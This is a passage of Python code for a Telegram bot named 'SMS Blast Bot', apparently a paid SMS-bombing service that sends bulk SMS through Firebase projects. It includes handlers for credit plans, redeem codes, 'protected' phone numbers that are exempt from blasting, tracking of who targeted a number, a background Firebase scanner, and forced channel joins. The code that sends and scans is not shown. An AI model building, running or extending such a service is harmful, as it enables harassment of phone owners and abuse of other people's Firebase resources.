        f"🤖 Bulk SMS via Firebase devices.\n\n"
        f"👤 Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"💬 Support: Contact owner\n\n"
        f"<i>Add Firebase via Owner Panel → Manage Firebase</i>",
        reply_markup=kb([("Back", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

# ========== OWNER: PROTECT NUMBER ==========
@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"🔒 Protect Number\n\nEnter phone number to protect:\n<i>Example: +919876543210</i>",
        reply_markup=kb([("Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"❌ Invalid number. Try again.", parse_mode="HTML")
        return
    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)
    await state.clear()
    await msg.answer(
        f"🔒 Number Protected!\n\n📞 <code>{number}</code>\n👤 Protected by: <code>{uid}</code>",
        reply_markup=kb([("Back", "owner:home")]),
        parse_mode="HTML"
    )
    log_activity(d, "number_protected", uid, f"Protected {number}")

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.message.edit_text(
            f"🔐 Protected Numbers List\n\n❌ No protected numbers.",
            reply_markup=kb([("Back", "owner:home")]),
            parse_mode="HTML"
        )
        return
    lines = [f"🔐 Protected Numbers List\n\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)
    for number, protector_uid in protected.items():
        if is_owner_user:
            display_number = number
        else:
            display_number = mask_number(number)
        protector_data = d.get("users", {}).get(str(protector_uid), {})
        protector_name = protector_data.get("name", "Unknown")
        lines.append(f"📞 <code>{display_number}</code>\n   🔒 Protected by: <code>{protector_uid}</code> ({protector_name})\n")
    rows = []
    if is_owner_user:
        rows.append([btn("Remove Protection", "owner:protected_remove", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("Back", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ No protected numbers!", show_alert=True)
        return
    rows = []
    for number, protector_uid in protected.items():
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("Back", "owner:protected_list", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"🗑 Remove Protected Number",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    number = cq.data.split("owner:protected_del:", 1)[1]
    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Protection removed for {number}!", show_alert=True)
    else:
        await cq.answer("❌ Number not found!", show_alert=True)
    await owner_protected_list(cq, state)

# ========== OWNER: TRACK NUMBER ==========
@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"📊 Number Tracker\n\nEnter phone number to track:\n<i>Example: +919876543210</i>",
        reply_markup=kb([("Cancel", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"❌ Invalid number. Try again.", parse_mode="HTML")
        return
    await state.clear()
    all_history = d.get("sms_history", {})
    users_who_sent = []
    for uid_str, history_list in all_history.items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str),
                    "name": user_data.get("name", "Unknown"),
                    "timestamp": entry.get("timestamp", 0)
                })
                break
    if not users_who_sent:
        await msg.answer(
            f"📊 Number Tracker\n\n📞 <code>{number}</code>\n\n❌ No one has sent SMS to this number yet.",
            reply_markup=kb([("Back", "owner:home")]),
            parse_mode="HTML"
        )
        return
    lines = [f"📊 Number Tracker\n\n📞 <code>{number}</code>\n"]
    lines.append(f"👥 Users who sent to this number:\n")
    for entry in users_who_sent:
        ts = fmt_time(entry["timestamp"])
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {ts}")
    await msg.answer("\n".join(lines), reply_markup=kb([("Back", "owner:home")]), parse_mode="HTML")

# ========== OWNER: EXPORT SCRIPT ==========
@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path):
            script_path = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(script_path):
                script_path = "main.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"📤 Script Export — {_VERSION}",
            parse_mode="HTML"
        )
    except Exception as e:
        await cq.answer(f"❌ Export failed: {str(e)[:40]}", show_alert=True)

# ========== FORCE JOIN ==========
@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    text = f"🔗 Force Join Settings\n\nStatus: {status}\nChannels: {len(channels)}\n\n"
    for ch in channels:
        req = "✅ Required" if ch.get("required", True) else "❌ Optional"
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"
    rows = [
        [btn("Add Channel", "owner:fj:add", EMOJI_CHECK, "➕", style="success")],
        [btn("Remove Channel", "owner:fj:remove", EMOJI_CROSS, "🗑", style="danger")],
        [InlineKeyboardButton(
            text=f"🟢 Enable" if not fj.get("enabled") else f"🔴 Disable",
            callback_data="owner:fj:toggle"
        )],
        [btn("Back", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"🔗 Add Force Join Channel\n\nStep 1/2: Channel ID:\n<i>Example: -1001234567890</i>",
        reply_markup=kb([("Cancel", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Send a valid channel ID (e.g. -100xxx).", parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        f"🔗 Step 2/2\n\nInvite link:\n<i>Example: https://t.me/+AbCdEfGhIjK</i>",
        reply_markup=kb([("Cancel", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"❌ Send a valid link starting with https://", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except:
        title = "Channel"
    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Channel Added!\n\n📢 {title}\n🔗 {link}",
        reply_markup=kb([("Back", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ No channels!", show_alert=True)
        return
    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("Back", "owner:fj:menu", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"🗑 Remove Channel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Channel removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await cq.answer(f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

# ========== PRICING ==========
@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"💳 Pricing Plans\n\nTotal Plans: {len(plans)}\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. {plan['name']}\n   💰 {plan['price']} {plan.get('currency', 'INR')} = {plan['credits']} credits\n   🔗 {plan['payment_link']}\n\n"
    rows = [
        [btn("Add Plan", "owner:pricing:add", EMOJI_CHECK, "➕", style="success")],
        [btn("Remove Plan", "owner:pricing:remove", EMOJI_CROSS, "🗑", style="danger")],
        [btn("Back", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"💳 Add Plan\n\nStep 1/4: Plan Name:\n<i>Example: Basic Plan</i>",
        reply_markup=kb([("Cancel", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

# ========== REDEEM CODES ==========
@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    text = f"🎁 Redeem Codes\n\nTotal: {len(codes)}\n\n"
    for code, data in list(codes.items())[:10]:
        status = "✅ Active" if data.get("uses_left", 0) > 0 else "❌ Expired"
        text += f"<code>{code}</code> — 💰{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("Generate Code", "owner:redeem:gen", EMOJI_CHECK, "➕", style="success")],
        [btn("Delete Code", "owner:redeem:del", EMOJI_CROSS, "🗑", style="danger")],
        [btn("Back", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

# ========== HOME HANDLERS ==========
@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.message.edit_text(f"⛔ No access!", parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# ========== MAIN FUNCTION ==========
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    
    try:
        me = await bot.get_me()
        log.info(f"✅ @{me.username} — SMS Blast Bot {_VERSION} started!")
        log.info(f"📊 Data file: {_DATA_FILE}")
        log.info(f"👤 Owner: {MAIN_OWNER}")
        
        if not os.path.exists(_DATA_FILE):
            d = _default_data()
            save(d)
            log.info("📄 Created new data file")
        
        d = load()
        log.info(f"🔥 Loaded {len(d.get('firebases', []))} firebases")
        log.info(f"👥 Total users: {len(d.get('users', {}))}")
        
        scanner_task = asyncio.create_task(background_firebase_scanner(bot))
        log.info("🔄 Background scanner started")
        
        try:
            await bot.send_message(
                MAIN_OWNER,
                f"🚀 SMS Blast Bot {_VERSION} Online!\n"
                f"@{me.username}\n"
                f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
                f"🔥 Firebases loaded: {len(d.get('firebases', []))}\n"
                f"👥 Total Users: {len(d.get('users', {}))}\n"
                f"🔄 Background Scanner: Running\n"
                f"⚡ Concurrent Users: 1000+\n"
                f"🔒 Number Protection: ENABLED\n"
                f"📹 Video Section: ENABLED\n"
                f"💸 Credit Transfer: ENABLED\n\n"
                f"<i>Bot is ready to send SMS via Firebase!</i>",
                parse_mode="HTML"
            )
        except Exception as e:
            log.warning(f"Owner notify failed: {e}")
        
        log.info("🔄 Starting polling...")
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
        
    except Exception as e:
        log.error(f"❌ Fatal error: {e}")
        raise
    finally:
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("🛑 Bot stopped by user")
    except Exception as e:
        log.error(f"❌ Fatal error: {e}")
